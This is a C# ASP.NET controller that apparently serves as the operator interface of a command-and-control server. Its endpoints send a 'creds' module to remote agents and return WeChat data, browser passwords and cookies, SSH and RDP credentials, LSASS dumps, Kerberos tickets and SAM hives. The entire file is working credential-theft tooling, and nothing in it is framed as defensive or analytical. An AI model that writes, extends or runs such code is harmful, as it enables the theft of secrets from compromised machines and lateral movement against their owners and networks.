using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/othersoft")]
[Authorize]
public class OtherSoftController : ControllerBase
{
    private readonly RelayService _relay;

    public OtherSoftController(RelayService relay)
    {
        _relay = relay;
    }

    private async Task<IActionResult> RelayAndWaitAsync(string agentId, object data, CancellationToken ct, int timeoutSeconds = 30)
    {
        // 任务化 relay：creds 模块 + op。
        var response = await _relay.RelayAndWaitAsync(agentId, "creds", data, ct,
            TimeSpan.FromSeconds(timeoutSeconds), createdBy: User.Identity?.Name ?? "system-relay");
        if (response == null)
            return StatusCode(504, new { error = "Agent did not respond in time." });
        return Content(response, "application/json");
    }

    [HttpPost("{agentId}/wechat")]
    public async Task<IActionResult> GetWeChat(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "wechat" }, ct);
    }

    [HttpPost("{agentId}/browser")]
    public async Task<IActionResult> GetBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "passwords" : "passwords";
        var offset = body.TryGetProperty("offset", out var o) ? o.GetInt32() : 0;
        var limit = body.TryGetProperty("limit", out var l) ? l.GetInt32() : 250;
        var timeout = type == "cookies" ? 60 : 30;
        return await RelayAndWaitAsync(agentId, new { op = "browser", type, offset, limit }, ct, timeout);
    }

    [HttpPost("{agentId}/browser/search")]
    public async Task<IActionResult> SearchBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "all" : "all";
        var keyword = body.TryGetProperty("keyword", out var k) ? k.GetString() ?? "" : "";
        if (string.IsNullOrWhiteSpace(keyword))
            return BadRequest(new { error = "keyword is required" });
        return await RelayAndWaitAsync(agentId, new { op = "browser_search", type, keyword }, ct, 60);
    }

    [HttpPost("{agentId}/ssh")]
    public async Task<IActionResult> GetSSH(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "ssh" }, ct, 20);
    }

    [HttpPost("{agentId}/rdp")]
    public async Task<IActionResult> GetRDP(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "rdp" }, ct, 30);
    }

    [HttpPost("{agentId}/lsass")]
    public async Task<IActionResult> DumpLsass(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var path = body.TryGetProperty("path", out var p) ? p.GetString() ?? "" : "";
        return await RelayAndWaitAsync(agentId, new { op = "lsass", path }, ct, 60);
    }

    [HttpPost("{agentId}/klist")]
    public async Task<IActionResult> Klist(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "klist" }, ct, 30);
    }

    [HttpPost("{agentId}/sam")]
    public async Task<IActionResult> SaveSam(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var dir = body.TryGetProperty("dir", out var d) ? d.GetString() ?? "" : "";
        return await RelayAndWaitAsync(agentId, new { op = "sam", dir }, ct, 30);
    }
}
